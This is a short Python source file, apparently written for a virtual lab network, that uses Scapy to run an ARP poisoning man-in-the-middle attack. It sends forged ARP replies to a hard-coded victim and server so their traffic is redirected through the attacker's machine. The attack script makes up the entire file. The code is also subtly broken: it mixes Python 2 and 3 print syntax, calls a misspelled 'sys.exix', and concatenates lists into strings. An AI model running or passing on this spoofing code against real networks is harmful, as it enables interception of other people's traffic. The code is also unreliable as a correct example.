from scapy.all import *
import util


attackerIP = "192.168.56.103"
networkInterface = "enp0s3"

victimIP = "192.168.56.101"
victimMAC = "08:00:27:b0:a1:ab"

spoofIP = "192.168.56.102"
serverMAC = "08:00:27:c6:a4:61"

def arpPoisoning(victimIP, spoofIP, networkInterface):
    attackerMAC = get_if_hwaddr(networkInterface)
    victimMAC =[util.getMAC(ip, networkInterface) for ip in victimIP ]
    spoofMAC = [util.getMAC(ip, networkInterface) for ip in spoofIP ]

    print  (attackerMAC ,victimMAC, spoofMAC)
    if spoofMAC==None or attackerMAC == None or victimMAC == None :
        print "Error occure! Attcker Mac : " +attackerMAC +"Victim Mac: " +victimMAC + "spoofing MAC :" +spoofMAC
        sys.exix()
    for i in range(0,len(victimIP)):
        for j in range(0,len(spoofIP)):
            if victimIP[i]!= spoofIP[j]:
                pktV = Ether() / ARP()
                pktV[Ether].src = attackerMAC
                pktV[ARP].hwsrc = attackerMAC
                pktV[ARP].psrc = spoofIP[j]
                pktV[ARP].hwdst = victimMAC[i]
                pktV[ARP].pdst = victimIP[i]

                sendp(pktV, iface=networkInterface)

                pktS = Ether() / ARP()
                pktS[Ether].src = attackerMAC
                pktS[ARP].hwsrc = attackerMAC
                pktS[ARP].psrc = victimIP[i]
                pktS[ARP].hwdst = spoofMAC[j]
                pktS[ARP].pdst = spoofIP[j]

                sendp(pktS, iface=networkInterface)


arpPoisoning([victimIP], [spoofIP], networkInterface)